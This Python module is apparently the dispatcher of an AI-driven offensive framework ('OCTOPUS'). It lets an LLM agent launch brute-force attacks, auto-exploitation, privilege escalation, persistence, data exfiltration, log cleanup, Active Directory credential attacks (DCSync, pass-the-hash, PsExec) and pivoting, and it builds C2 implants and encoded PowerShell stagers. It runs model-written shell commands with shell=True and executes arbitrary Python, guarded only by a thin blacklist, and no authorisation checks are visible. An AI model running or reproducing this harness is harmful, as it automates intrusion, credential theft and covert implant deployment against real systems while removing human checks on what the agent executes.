#!/usr/bin/env python3
"""
Main tool dispatcher, interactive tool selector, and command execution.
Extracted from tools.py.
"""

import subprocess
import shutil
import os
import re
import concurrent.futures
import time as _time
import logging

# ─────────────────────────────────────────────
# IMPORTS FROM SHARED BASE (breaks circular deps)
# ─────────────────────────────────────────────
from core.tools.base import (
    run_tool, is_tool_available, _fmt_elapsed, get_tool_config, ToolResult,
    C_GREY, C_RESET, C_CYAN, C_GREEN, C_YELLOW, C_RED, C_BLUE, C_MAGENTA,
    _TOOL_AVAILABLE,
)

# ─────────────────────────────────────────────
# IMPORTS FROM SIBLING MODULES
# ─────────────────────────────────────────────
from core.tools.exploit_tools import (
    register_credential, get_known_creds,
    get_best_creds_for_target, get_all_known_creds_for_target,
    _is_internal_ip, run_bruteforce, run_web_login_bruteforce,
    run_jmx2rce_scan, run_jmx2rce_rce, run_jmx2rce_read, run_jmx2rce_cleanup,
)
from core.tools.recon_tools import (
    run_nmap, run_whois, run_whatweb, run_curl_headers,
    run_dig, run_sslscan, run_ffuf, run_enum4linux,
    run_smbclient, run_wpscan, run_sqlmap, run_nikto,
    run_scrapling_fetch, run_scrapling_crawl,
    run_ssh_user_enum, run_ftp_anonymous_check, run_smtp_probe,
)
from core.tools.post_tools import (
    _run_ssh_session_interactive, _run_killchain_stage,
    _run_killchain_interactive, _run_waf_detect,
    _run_shodan_interactive, _run_shodan_host,
    _run_shodan_vulns, _run_shodan_range,
    _run_crack_hashes,
    _run_cpanel_exploit, _run_shardbrowser_osint,
    run_default_recon,
)

# ─────────────────────────────────────────────
# TOOLS MENU — used by interactive_tool_run()
# and run_single_tool()
# ─────────────────────────────────────────────
TOOLS_MENU = {
    "1":  ("nmap",               run_nmap),
    "2":  ("whois",              run_whois),
    "3":  ("whatweb",            run_whatweb),
    "4":  ("curl headers",       run_curl_headers),
    "5":  ("dig DNS",            run_dig),
    "6":  ("sslscan",            run_sslscan),
    "7":  ("ffuf",               run_ffuf),
    "8":  ("enum4linux",         run_enum4linux),
    "9":  ("smbclient",          run_smbclient),
    "10": ("wpscan",             run_wpscan),
    "11": ("sqlmap",             run_sqlmap),
    "12": ("nikto",              run_nikto),
    "13": ("scrapling",          lambda t: run_scrapling_fetch(f"http://{t}")),
    "14": ("jmx2rce",            run_jmx2rce_scan),
    "15": ("ssh_user_enum",      run_ssh_user_enum),
    "16": ("bruteforce SSH",     lambda t: run_bruteforce("ssh", t)),
    "17": ("web login brute",    run_web_login_bruteforce),
    "18": ("ssh_session",        lambda t: _run_ssh_session_interactive(t)),
    "19": ("vuln assess",        lambda t: _run_killchain_stage("vuln_assess", t)),
    "20": ("auto exploit",       lambda t: _run_killchain_stage("auto_exploit", t)),
    "21": ("privesc",            lambda t: _run_killchain_interactive("privesc", t)),
    "22": ("persistence",        lambda t: _run_killchain_interactive("persist", t)),
    "23": ("lateral move",       lambda t: _run_killchain_interactive("lateral", t)),
    "24": ("data exfil",         lambda t: _run_killchain_interactive("exfil", t)),
    "25": ("FULL KILL CHAIN",    lambda t: _run_killchain_interactive("full", t)),
    "26": ("WAF detect",         lambda t: _run_waf_detect(t)),
    "27": ("stealth cleanup",    lambda t: _run_killchain_interactive("cleanup", t)),
    "28": ("shodan search",      lambda t: _run_shodan_interactive(t)),
    "29": ("shodan host",        lambda t: _run_shodan_host(t)),
    "30": ("shodan vulns",       lambda t: _run_shodan_vulns(t)),
    "31": ("crack hashes",       lambda t: _run_crack_hashes(t)),
    "32": ("shodan range",       lambda t: _run_shodan_range(t)),
    "33": ("cpanel exploit",     lambda t: _run_cpanel_exploit(t)),
    "34": ("shardbrowser",       lambda t: _run_shardbrowser_osint(t)),
    # ── v9.0: Active Directory ──
    "35": ("AD enumerate",       lambda t: _run_ad_tool("enum", t)),
    "36": ("AS-REP Roast",       lambda t: _run_ad_tool("asrep", t)),
    "37": ("Kerberoast",         lambda t: _run_ad_tool("kerberoast", t)),
    "38": ("DCSync",             lambda t: _run_ad_tool("dcsync", t)),
    "39": ("Pass-the-Hash",      lambda t: _run_ad_tool("pth", t)),
    "40": ("PsExec",             lambda t: _run_ad_tool("psexec", t)),
    "41": ("WMIExec",            lambda t: _run_ad_tool("wmiexec", t)),
    # ── v9.0: Pivoting ──
    "42": ("SOCKS proxy",        lambda t: _run_pivot_tool("socks", t)),
    "43": ("port forward",       lambda t: _run_pivot_tool("forward", t)),
    "44": ("network recon",      lambda t: _run_pivot_tool("netinfo", t)),
    # ── v9.0: C2 Implants ──
    "45": ("build Go implant",   lambda t: _run_c2_build("go", t)),
    "46": ("build Py implant",   lambda t: _run_c2_build("python", t)),
    "47": ("build PS stager",    lambda t: _run_c2_build("powershell", t)),
    "48": ("DNS C2 listener",    lambda t: _run_c2_build("dns", t)),
    "49": ("FTP anonymous",      run_ftp_anonymous_check),
    "50": ("SMTP probe",         run_smtp_probe),
}


def _detect_web_ports_from_nmap(nmap_output: str) -> list:
    """Return open HTTP-like ports from nmap output, preserving scan order."""
    web_ports = []
    http_like_ports = {
        "80", "443", "8000", "8008", "8080", "8081", "8082", "8443",
        "1443", "3000", "3030", "5000", "5601", "8888", "9000",
        "9090", "10000", "2082", "2083", "2086", "2087", "2095", "2096",
    }
    for line in (nmap_output or "").splitlines():
        match = re.match(r'\s*(\d+)/tcp\s+open\s+(\S+)(?:\s+(.+))?', line, re.IGNORECASE)
        if not match:
            continue
        port, service, banner = match.groups()
        text = f"{service} {banner or ''}".lower()
        is_web = (
            port in http_like_ports
            or "http" in text
            or "cpanel" in text
            or "whm" in text
            or "node.js" in text
            or "express" in text
            or "php" in text
            or "golang net/http" in text
        )
        if is_web and port not in web_ports:
            web_ports.append(port)
    return web_ports

# ─────────────────────────────────────────────
# INDIVIDUAL TOOLS
# ─────────────────────────────────────────────



def run_single_tool(tool_key: str, target: str) -> str:
    """Run one tool by its menu key. Used by AI tool dispatch."""
    if tool_key in TOOLS_MENU:
        name, func = TOOLS_MENU[tool_key]
        return func(target)
    return f"[!] Unknown tool key: {tool_key}"


def format_recon_for_llm(results: dict) -> str:
    """
    Flatten the recon results dict into one clean string
    to paste into the LLM prompt.
    """
    output = ""
    for tool, data in results.items():
        output += f"\n{'='*50}\n"
        output += f"[ {tool.upper()} OUTPUT ]\n"
        output += f"{'='*50}\n"
        output += data.strip() + "\n"
    return output



# ── PYTHON REPL (Dynamic Script Execution) ──
def run_python_repl(code: str) -> str:
    import sys
    from io import StringIO
    import traceback

    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()

    try:
        # Use exec to run the code
        exec(code, {})
        output = redirected_output.getvalue()
    except Exception as e:
        output = redirected_output.getvalue() + "\n[!] REPL Error:\n" + traceback.format_exc()
    finally:
        sys.stdout = old_stdout

    return output



def run_tool_by_command(command_str: str) -> str:
    """
    Called by LLM tool dispatch when AI writes [TOOL: nmap -sV 1.2.3.4].
    Splits the string and runs it safely.
    v3.2: Comprehensive hallucination handling — catches fake tools, wrong syntax.
    v12.0: Dynamic dispatch using the tool registry and structured argument parsing.
    """
    parts = command_str.strip().split()
    if not parts:
        return "[!] Empty command."

    cmd_lower = parts[0].lower()

    # ── HELPER: Extract clean IP from 'IP:PORT' or 'http://IP:PORT/path' ──
    def _extract_ip(s):
        s = s.replace("http://", "").replace("https://", "")
        s = s.split("/")[0]  # remove path
        s = s.split(":")[0]  # remove port
        return s

    # ── BLOCK: Hallucinated/fake tools → return helpful error ──
    _FAKE_TOOLS = {
        "metasploit_scan": "Use [MSF: auxiliary/scanner/... | RHOSTS=IP] or [SEARCH: CVE-...]",
        "metasploit_exploit": "Use [MSF: exploit/... | RHOSTS=IP]",
        "nikto_scan": "Use [CMD: nikto -h IP]",
        "service_version_enumeration": "Use [TOOL: nmap -Pn -sT -sV IP]",
        "cms_detect": "Use [TOOL: scrapling http://IP] and [CMD: whatweb http://IP]",
        "webdav_scan": "Use [CMD: nmap --script http-webdav-scan IP]",
        "cve_lookup": "Use [SEARCH: CVE-YYYY-NNNNN] or [SEARCHSPLOIT: service version]",
        "dirbuster": "Use [TOOL: dirb_fuzz http://IP]",
        "format_b_final_analysis": "NOT a tool. Write your analysis directly in Format B.",
        "dirb": "Use [TOOL: dirb_fuzz http://IP]",
        "hydra": "Use [TOOL: bruteforce SERVICE IP]",
        "metasploit_web_enum": "Use [TOOL: scrapling http://IP]",
        "msf_web_enum": "Use [TOOL: scrapling http://IP]",
        "smb_enum": "Use [CMD: enum4linux -a IP]",
        "msfconsole": "Use [MSF: module/path | RHOSTS=IP] instead of calling msfconsole directly",
    }
    if cmd_lower in _FAKE_TOOLS:
        hint = _FAKE_TOOLS[cmd_lower]
        target_hint = _extract_ip(parts[1]) if len(parts) > 1 else "TARGET"
        return f"[!] '{parts[0]}' is NOT a real tool. AI: Use correct syntax: {hint.replace('IP', target_hint)}"

    from core.tools.registry import get_tool, list_tools
    import inspect

    alias_token_count = 1
    tool_def = get_tool(cmd_lower)
    if not tool_def and len(parts) >= 2:
        two_word_name = f"{parts[0].lower()} {parts[1].lower()}"
        tool_def = get_tool(two_word_name)
        if tool_def:
            cmd_lower = two_word_name
            alias_token_count = 2

    if not tool_def:
        # Fallback to pure shell command if not registered and not destructive
        blocked = ["rm", "dd", "mkfs", "shutdown", "reboot", "wget", "chmod"]
        if parts[0] in blocked:
            return f"[!] Blocked command: {parts[0]}"

        # If the command looks like a shell command but might be a typo'd tool
        available_tools = ", ".join([t.name for t in list_tools()])
        print(f"  [93m[!] Tool '{cmd_lower}' not found in registry. Running as raw command.[0m")
        # return f"[!] Tool '{cmd_lower}' not found. Available tools: {available_tools}"
        from core.tools.base import run_tool
        return run_tool(parts)

    def parse_args_for_tool(cmd_string: str, t_def):
        p_parts = cmd_string.strip().split()
        if not p_parts:
            return [], {}
        args = p_parts[alias_token_count:]
        sig = inspect.signature(t_def.func)
        params = list(sig.parameters.values())
        kwargs = {}
        positional_args = []

        # NMAP specific garbage stripping logic ported over
        if t_def.name == "nmap" and args:
            clean_parts = []
            skip_next = False
            for p in args:
                if skip_next:
                    skip_next = False
                    continue
                if p in ["-oX", "-oN", "-oG", "-oA", "-o"] or p.startswith("--output"):
                    skip_next = True
                    continue
                if p.startswith("--ports"):
                    continue
                clean_parts.append(p)
            args = clean_parts
            if not args:
                return [], {}
            target_ip = args[-1]
            extra_flags = args[:-1]
            return [target_ip], {"extra_flags": extra_flags if extra_flags else None}

        # Searchsploit specific stripping logic
        if t_def.name == "searchsploit" and args:
            clean_terms = []
            skip_next = False
            for p in args:
                if skip_next:
                    skip_next = False
                    continue
                if p in ["-s", "--service", "--output", "-p", "--path"]:
                    continue
                if p.startswith("--exclude") or (p.startswith("-p") and len(p) <= 3):
                    skip_next = True
                    continue
                clean_terms.append(p.strip('"').strip("'"))
            return [" ".join(clean_terms)], {}

        for i, p in enumerate(params):
            if p.name in ['target', 'target_ip', 'host', 'url', 'filepath']:
                if args:
                    positional_args.append(_extract_ip(args.pop(0)))
                elif p.default != inspect.Parameter.empty:
                    kwargs[p.name] = p.default
            elif p.name in ['query', 'recon_data', 'cmd', 'command', 'action', 'options', 'options_str']:
                if args:
                    positional_args.append(' '.join(args))
                    args = []
                elif p.default != inspect.Parameter.empty:
                    kwargs[p.name] = p.default
            elif p.name in ['extra_flags', 'opts']:
                if args:
                    positional_args.append(args)
                    args = []
                elif p.default != inspect.Parameter.empty:
                    kwargs[p.name] = p.default
            elif p.name in ['user', 'pwd', 'password']:
                if args:
                    positional_args.append(args.pop(0))
                elif p.default != inspect.Parameter.empty:
                    kwargs[p.name] = p.default
            else:
                if args:
                    positional_args.append(args.pop(0))
                elif p.default != inspect.Parameter.empty:
                    kwargs[p.name] = p.default
        if args:
            positional_args.extend(args)
        return positional_args, kwargs

    # Explicit debugging
    print(f"  [94m[*] Dispatching tool: {tool_def.name} (via {cmd_lower})[0m")
    try:
        p_args, p_kwargs = parse_args_for_tool(command_str, tool_def)
        print(f"      -> Args: {p_args}, Kwargs: {p_kwargs}")
        return tool_def.func(*p_args, **p_kwargs)
    except Exception as e:
        import traceback
        return f"[!] Error executing tool '{tool_def.name}': {e}\\n{traceback.format_exc()}"



# ─────────────────────────────────────────────
# INTERACTIVE TOOL SELECTOR (called from CLI)
# ─────────────────────────────────────────────

def interactive_tool_run(target: str) -> str:
    """
    Let user manually pick which tools to run.
    Returns combined output string.
    """
    print("\n[ SELECT TOOLS TO RUN ]")
    for key, (name, _) in TOOLS_MENU.items():
        print(f"  [{key}] {name:<15}")
    print("\n  [a] Run all standard (fast/concurrent)")
    print("  [n] Run standard + smart extended (auto-detects SSH/Web/FTP)")

    choice = input("\nChoice(s) e.g. 1 2 4 or a: ").strip().lower()

    if choice == "a":
        results = run_default_recon(target)
        return format_recon_for_llm(results)

    if choice == "n":
        results = run_default_recon(target)

        # ── PORT-AWARE EXTENDED TOOLS ──────────────────────────
        nmap_output = results.get("nmap", "")
        curl_output = results.get("curl_headers", "")
        whatweb_output = results.get("whatweb", "")
        all_recon = nmap_output + curl_output + whatweb_output

        # ── Scrape ALL detected web-like ports individually ──────
        web_ports_detected = _detect_web_ports_from_nmap(nmap_output)

        # Improved web detection: check nmap + curl + whatweb
        has_web = (len(web_ports_detected) > 0
                   or "HTTP/" in curl_output
                   or "nginx" in all_recon.lower()
                   or "apache" in all_recon.lower()
                   or "Server:" in curl_output)
        has_ssh = "22/tcp" in nmap_output and "open" in nmap_output
        has_ftp = "21/tcp" in nmap_output and "open" in nmap_output

        if not web_ports_detected and has_web:
            web_ports_detected = ["80"]  # default

        # ── PHASE 1: Run web tools and SSH user enum in parallel ──
        phase1_futures = {}
        enum_users = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            if has_web:
                print(f"\n  [*] Web ports detected {web_ports_detected} — running extended web tools...")
                phase1_futures[executor.submit(run_wpscan, target)] = "wpscan"
                phase1_futures[executor.submit(run_sqlmap, target)] = "sqlmap"
                phase1_futures[executor.submit(run_nikto, target)] = "nikto"
                phase1_futures[executor.submit(run_web_login_bruteforce, target)] = "web_login_brute"

                # v4.0: Scrape EACH web port individually
                for wp in web_ports_detected:
                    proto = "https" if wp in ("443", "8443", "1443") else "http"
                    scrape_url = f"{proto}://{target}:{wp}" if wp not in ("80", "443") else f"{proto}://{target}"
                    phase1_futures[executor.submit(run_scrapling_fetch, scrape_url)] = f"scrapling_port{wp}"
                    print(f"    [*] Scrapling: {scrape_url}")

                # v5.0: nikto only on primary port 80 — running 3+ instances
                # was blocking the agent for 15+ minutes with timeouts
                # Non-standard ports are covered by scrapling + nmap scripts
            else:
                print("\n  [*] No web ports open — skipping wpscan, sqlmap, nikto")

            if has_ssh:
                print("  [*] SSH detected — running user enumeration first...")
                phase1_futures[executor.submit(run_ssh_user_enum, target)] = "ssh_user_enum"

            if has_ftp:
                print("  [*] FTP detected — running bruteforce...")
                phase1_futures[executor.submit(run_bruteforce, "ftp", target)] = "ftp_bruteforce"

            if not phase1_futures:
                print("  [*] No exploitable services found for extended tools.")

            for future in concurrent.futures.as_completed(phase1_futures):
                tool_name = phase1_futures[future]
                try:
                    result = future.result()
                    results[tool_name] = result
                    if tool_name == "ssh_user_enum":
                        result_str = str(result)
                        if "UNRELIABLE" in result_str:
                            print(f"  [!] SSH user enum results UNRELIABLE (server patched) — using defaults")
                        elif "VALID USER" in result_str:
                            import re as _re
                            for m in _re.finditer(r'[✓]\s+(\S+)', result_str):
                                enum_users.append(m.group(1))
                            print(f"  [+] SSH enum found {len(enum_users)} valid users: {enum_users}")
                except Exception as exc:
                    results[tool_name] = f"[!] {tool_name} error: {exc}"

        # ── PHASE 2: SSH bruteforce with discovered users ──
        if has_ssh:
            print(f"\n  [*] Phase 2: SSH bruteforce with {len(enum_users) if enum_users else 'default'} users...")
            try:
                results["ssh_bruteforce"] = run_bruteforce("ssh", target, extra_users=enum_users or None)
            except Exception as exc:
                results["ssh_bruteforce"] = f"[!] ssh_bruteforce error: {exc}"

        # ── PHASE 3 (v4.0): Vulnerability Assessment ──
        print(f"\n  [*] Phase 3: Kill chain vulnerability assessment...")
        try:
            from core.killchain import vuln_assess
            recon_blob = format_recon_for_llm(results)
            results["vuln_assess"] = vuln_assess(target, recon_blob)
        except ImportError:
            results["vuln_assess"] = "[!] core.killchain package not found — skipping vuln assessment"
        except Exception as exc:
            results["vuln_assess"] = f"[!] vuln_assess error: {exc}"

        return format_recon_for_llm(results)

    combined = {}
    for key in choice.split():
        if key in TOOLS_MENU:
            name, func = TOOLS_MENU[key]
            print(f"\n[*] Running {name}...")
            combined[name] = func(target)
        else:
            print(f"[!] Unknown option: {key}")

    return format_recon_for_llm(combined)


# ─────────────────────────────────────────────
# ARBITRARY COMMAND RUNNER (ENHANCED v3.0)
# ─────────────────────────────────────────────

def run_arbitrary_cmd(cmd_str: str) -> str:
    """
    Allows AI to run generic bash commands, with smart timeouts and safety checks.
    Uses shell=True to support pipes and complex arguments.
    v3.0: Smart timeout per command type.
    """
    parts = cmd_str.strip().split()
    if not parts:
        return "[!] Empty command."

    # strict blacklist
    blacklist = ["rm", "dd", "mkfs", "shutdown", "reboot", "poweroff", "init", "mv"]
    if parts[0] in blacklist or any(b in f" {cmd_str} " for b in [" rm ", " dd ", " mkfs "]):
        return f"[!] Command blocked for safety: {cmd_str}"

    # v5.0: Block external commands targeting internal IPs
    # AI sometimes runs enum4linux/nmap against internal IPs discovered inside a target
    _EXTERNAL_NETWORK_TOOLS = {"enum4linux", "nmap", "nikto", "hydra", "smbclient",
                                "curl", "wget", "sqlmap", "wpscan", "masscan", "gobuster"}
    if parts[0].lower() in _EXTERNAL_NETWORK_TOOLS and len(parts) >= 2:
        for arg in parts[1:]:
            clean_ip = arg.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
            if _is_internal_ip(clean_ip):
                print(f"  {C_RED}[!] BLOCKED: {clean_ip} is internal — cannot reach from outside{C_RESET}")
                return (
                    f"[!] BLOCKED: {clean_ip} is a private/internal IP. "
                    f"You CANNOT run {parts[0]} against it from outside.\n"
                    f"AI: Use [TOOL: network_recon COMPROMISED_HOST] or an explicit gated pivot tool. "
                    f"Do not invent arbitrary ssh_exec scans."
                )

    # Smart timeout based on command type
    tool = parts[0].lower()

    # Prefer the decorator registry for internal OCTOPUS tools. Without this,
    # task-map commands such as killchain_privesc/plugin/ssh_session are treated
    # as shell binaries and fail with "command not found".
    try:
        from core.tools.registry import get_tool
        two_word = f"{parts[0].lower()} {parts[1].lower()}" if len(parts) >= 2 else ""
        if get_tool(tool) or (two_word and get_tool(two_word)):
            return run_tool_by_command(cmd_str)
    except Exception as _exc:
        logging.debug(f"Suppressed in runner.py: {_exc}")

    if tool in {"bruteforce", "bruteforce_ssh", "bruteforce_ftp", "web_login_bruteforce"}:
        return run_tool_by_command(cmd_str)

    timeout_map = {
        "telnet":     10,   # Was 300! Telnet should be quick banner grab only
        "ssh":        15,   # SSH connection test
        "ftp":        15,   # FTP anonymous test
        "nc":         10,   # Netcat — dangerous for hanging
        "netcat":     10,
        "ping":       15,   # Quick ping test
        "curl":       30,   # HTTP request
        "wget":       30,
        "hydra":      300,  # Bruteforce needs time
        "nmap":       300,  # Scanning needs time
        "masscan":    120,  # Fast scanner
        "nikto":      300,
        "sqlmap":     300,
        "wpscan":     180,
        "gobuster":   120,
        "ffuf":       120,
        "enum4linux": 150,
        "smbclient":  45,
        "msfconsole": 300,
        "searchsploit": 30,
        "jmx2rce":    60,   # Tomcat JMX exploit
        "nuclei":     180,  # Template scanner
        "nxc":        60,   # NetExec/CrackMapExec
        "crackmapexec": 60,
    }
    timeout = timeout_map.get(tool, 120)

    # Prevent interactive commands from hanging the agent
    if tool == "ssh" and "-o BatchMode=yes" not in cmd_str:
        cmd_str = cmd_str.replace("ssh ", "ssh -o BatchMode=yes -o StrictHostKeyChecking=no ", 1)
    elif tool == "ftp":
        # Wrap ftp in a timeout wrapper since ftp itself is interactive
        cmd_str = f"echo 'quit' | timeout {timeout} {cmd_str}"
    elif tool == "telnet":
        # Wrap telnet with timeout — it doesn't have its own
        cmd_str = f"timeout {timeout} {cmd_str}"
    elif tool == "msfconsole":
        # v7.0: Block direct msfconsole calls — they bypass our module correction map
        # AI should use [MSF:] tag instead
        return (
            "[!] DO NOT call msfconsole directly via [CMD:].\n"
            "Use [MSF: module_path | RHOSTS=IP] instead — it validates modules and prevents hangs.\n"
            "AI: Reformat your request as [MSF: exploit/path | RHOSTS=IP RPORT=PORT]"
        )
    elif tool == "hydra":
        # v7.0: Block hydra — use [TOOL: bruteforce service IP] instead
        return (
            "[!] DO NOT call hydra directly.\n"
            "Use [TOOL: bruteforce ssh IP] or [TOOL: bruteforce ftp IP] instead.\n"
            "The built-in bruteforce uses stealth paramiko transport reuse."
        )

    print(f"  [*] Executing generic CMD: {cmd_str}")

    import time, threading

    lines = []
    start_time = time.time()
    _exit_code = -1

    # Dynamic heartbeat (same logic as run_tool)
    if timeout > 300:
        heartbeat_interval = 60
    else:
        heartbeat_interval = 30

    try:
        proc = subprocess.Popen(
            cmd_str, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        def _read():
            for line in proc.stdout:
                line = line.rstrip('\n')
                lines.append(line)
                # Show important lines live
                if any(kw in line.lower() for kw in [
                    "host:", "login:", "password", "found", "valid",
                    "[ssh]", "[22]", "[80]", "success", "open",
                    "vuln", "error", "complete", "[+]", "session"
                ]):
                    elapsed = int(time.time() - start_time)
                    print(f"      [{elapsed}s] {line[:140]}")

        reader = threading.Thread(target=_read, daemon=True)
        reader.start()

        while reader.is_alive():
            reader.join(timeout=heartbeat_interval)
            elapsed = int(time.time() - start_time)
            if elapsed > timeout:
                proc.kill()
                proc.wait()
                lines.append(f"[!] Timed out after {timeout}s")
                print(f"      [TIMEOUT] {tool} killed after {_fmt_elapsed(timeout)}")
                break
            if reader.is_alive():
                print(f"      [♻ {tool} running... {_fmt_elapsed(elapsed)} / {_fmt_elapsed(timeout)} max]")

        proc.wait(timeout=5)
        _exit_code = proc.returncode or 0

    except Exception as e:
        _duration = time.time() - start_time
        return ToolResult(
            tool_name=tool, command=cmd_str, stdout=f"[!] Command failed: {e}",
            stderr=str(e), exit_code=-1, duration=_duration)

    output = "\n".join(lines)
    _duration = time.time() - start_time

    if not output.strip():
        return ToolResult(
            tool_name=tool, command=cmd_str, stdout="[!] Command returned no output.",
            exit_code=_exit_code, duration=_duration)

    # Truncate for AI context
    if len(lines) > 200:
        output = f"[... truncated {len(lines) - 200} lines ...]\n" + "\n".join(lines[-200:])

    return ToolResult(
        tool_name=tool, command=cmd_str, stdout=output,
        exit_code=_exit_code, duration=_duration)


# ─────────────────────────────────────────────
# v9.0: AD TOOL HANDLERS
# ─────────────────────────────────────────────

def _creds_to_dict(creds, service: str = "") -> dict:
    """Normalize legacy tuple credentials to the dict shape AD modules expect."""
    if isinstance(creds, dict):
        user = creds.get("user") or creds.get("username") or ""
        password = creds.get("password") or creds.get("pwd") or ""
        return {
            "user": user,
            "username": user,
            "password": password,
            "domain": creds.get("domain", ""),
            "nthash": creds.get("nthash", ""),
            "service": creds.get("service", service),
            "port": creds.get("port", 22 if service == "ssh" else 0),
        }
    if isinstance(creds, (tuple, list)) and len(creds) >= 2:
        user, password = creds[0], creds[1]
        if user and password:
            return {
                "user": user,
                "username": user,
                "password": password,
                "domain": "",
                "nthash": "",
                "service": service,
                "port": 22 if service == "ssh" else 0,
            }
    return {"user": "", "username": "", "password": "", "domain": "", "nthash": "", "service": service, "port": 0}


def _run_ad_tool(action: str, target: str) -> str:
    """Dispatch Active Directory attack tools."""
    import logging
    logger = logging.getLogger("octopus.runner.ad")

    try:
        creds = _creds_to_dict(get_best_creds_for_target(target, "ldap"), "ldap")
        if not creds["user"]:
            creds = _creds_to_dict(get_best_creds_for_target(target, "ssh"), "ssh")
        user = creds.get("user", "")
        password = creds.get("password", "")

        if action == "enum":
            from core.killchain.ad.enumeration import run_ad_enum
            return run_ad_enum(target, creds=creds if user else None)
        elif action == "asrep":
            from core.killchain.ad.kerberos import asrep_roast
            return asrep_roast(target, creds=creds if user else None)
        elif action == "kerberoast":
            from core.killchain.ad.kerberos import kerberoast
            if not user:
                return "[!] Kerberoasting requires valid domain credentials. Run bruteforce or find creds first."
            return kerberoast(target, creds)
        elif action == "dcsync":
            from core.killchain.ad.credential import dcsync
            if not user:
                return "[!] DCSync requires domain admin credentials."
            return dcsync(target, creds)
        elif action == "pth":
            from core.killchain.ad.credential import pass_the_hash
            nthash = input(f"\033[36m  NT Hash: \033[0m").strip()
            if not nthash:
                return "[!] Pass-the-Hash requires an NT hash."
            return pass_the_hash(target, user or "Administrator", nthash, domain=creds.get("domain", ""))
        elif action == "psexec":
            from core.killchain.ad.lateral import psexec
            if not user:
                return "[!] PsExec requires valid credentials."
            return psexec(target, creds)
        elif action == "wmiexec":
            from core.killchain.ad.lateral import wmiexec
            if not user:
                return "[!] WMIExec requires valid credentials."
            return wmiexec(target, creds)
        else:
            return f"[!] Unknown AD action: {action}"
    except ImportError as e:
        return f"[!] AD module dependency missing: {e}\n    Install: pip install impacket ldap3"
    except Exception as e:
        logger.error(f"AD tool {action} failed: {e}")
        return f"[!] AD {action} failed: {e}"


# ─────────────────────────────────────────────
# v9.0: PIVOT TOOL HANDLERS
# ─────────────────────────────────────────────

def _run_pivot_tool(action: str, target: str) -> str:
    """Dispatch pivoting tools."""
    import logging
    logger = logging.getLogger("octopus.runner.pivot")

    try:
        creds = _creds_to_dict(get_best_creds_for_target(target, "ssh"), "ssh")
        user = creds.get("user", "")
        password = creds.get("password", "")

        if not user:
            return "[!] Pivoting requires SSH credentials. Find credentials first."

        try:
            import paramiko
        except ImportError:
            return "[!] paramiko not installed. Fix: pip install paramiko"

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        port = int(creds.get("port", 22))
        ssh.connect(target, port=port, username=user, password=password, timeout=15)

        if action == "socks":
            from core.killchain.pivot import setup_socks_proxy
            local_port = int(input(f"\033[36m  Local SOCKS port [1080]: \033[0m").strip() or "1080")
            return setup_socks_proxy(ssh, local_port=local_port)
        elif action == "forward":
            from core.killchain.pivot import setup_local_forward
            local_port = int(input(f"\033[36m  Local port: \033[0m").strip() or "8080")
            remote_host = input(f"\033[36m  Remote host [127.0.0.1]: \033[0m").strip() or "127.0.0.1"
            remote_port = int(input(f"\033[36m  Remote port: \033[0m").strip() or "80")
            return setup_local_forward(ssh, local_port, remote_host, remote_port)
        elif action == "netinfo":
            from core.killchain.pivot import get_network_info
            return get_network_info(ssh)
        else:
            ssh.close()
            return f"[!] Unknown pivot action: {action}"
    except Exception as e:
        logger.error(f"Pivot tool {action} failed: {e}")
        return f"[!] Pivot {action} failed: {e}"


# ─────────────────────────────────────────────
# v9.0: C2 BUILD HANDLERS
# ─────────────────────────────────────────────

def _run_c2_build(build_type: str, target: str) -> str:
    """Dispatch C2 implant build tools."""
    import logging
    logger = logging.getLogger("octopus.runner.c2")

    try:
        c2_url = input(f"\033[36m  C2 URL [http://127.0.0.1:8443]: \033[0m").strip() or "http://127.0.0.1:8443"

        if build_type == "go":
            # Existing garble builder
            from core.c2.builder import build_implant
            goos = input(f"\033[36m  Target OS [linux]: \033[0m").strip() or "linux"
            goarch = input(f"\033[36m  Target Arch [amd64]: \033[0m").strip() or "amd64"
            return build_implant(c2_urls=[c2_url], target_os=goos, target_arch=goarch)

        elif build_type == "python":
            from core.c2.implants.python_implant import generate_python_implant
            code = generate_python_implant(c2_urls=[c2_url], beacon_interval=60)
            out_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                                    "data", f"implant_python_{target.replace('.', '_')}.py")
            os.makedirs(os.path.dirname(out_path), exist_ok=True)
            with open(out_path, "w") as f:
                f.write(code)
            return f"[+] Python implant generated: {out_path}\n    Size: {len(code)} bytes\n    C2: {c2_url}"

        elif build_type == "powershell":
            from core.c2.implants.powershell_stager import generate_ps_stager, generate_ps_encoded
            method = input(f"\033[36m  Method (iex/encoded) [iex]: \033[0m").strip() or "iex"
            if method == "encoded":
                code = generate_ps_encoded(c2_url)
            else:
                code = generate_ps_stager(c2_url, method="iex")
            out_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                                    "data", f"stager_{target.replace('.', '_')}.ps1")
            os.makedirs(os.path.dirname(out_path), exist_ok=True)
            with open(out_path, "w") as f:
                f.write(code)
            return f"[+] PowerShell stager generated: {out_path}\n    C2: {c2_url}"

        elif build_type == "dns":
            from core.c2.channels.dns import DNSChannel
            domain = input(f"\033[36m  DNS C2 domain: \033[0m").strip()
            if not domain:
                return "[!] DNS C2 requires a domain name."
            channel = DNSChannel(domain)
            return f"[+] DNS C2 channel configured for: {domain}\n    Use channel.start_listener() to begin receiving beacons."

        else:
            return f"[!] Unknown build type: {build_type}"
    except ImportError as e:
        return f"[!] C2 module dependency missing: {e}"
    except Exception as e:
        logger.error(f"C2 build {build_type} failed: {e}")
        return f"[!] C2 build failed: {e}"


# ─────────────────────────────────────────────
# QUICK TEST
# ─────────────────────────────────────────────

if __name__ == "__main__":
    target = input("Enter test target (IP or domain): ").strip()
    results = run_default_recon(target)
    print(format_recon_for_llm(results))
